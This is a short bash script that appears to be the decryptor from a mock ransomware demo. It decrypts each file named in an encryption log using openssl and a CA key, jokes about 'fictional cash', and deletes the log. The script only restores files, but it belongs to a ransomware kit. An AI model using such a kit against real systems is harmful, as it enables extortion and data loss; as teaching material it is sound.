#!/bin/bash

keypath=./ca.key

for file in $(cat $HOME/encrypted-list.txt)
do
    openssl smime -decrypt -binary -in $file -inform DER -out data -inkey $keypath
    mv -f data $file
done

echo "[+] Done decrypting the files in $HOME/encrypted-list.txt. Thanks for your fictional cash! Now removing the encryption log at $HOME/encrypted-list.txt."
rm $HOME/encrypted-list.txt
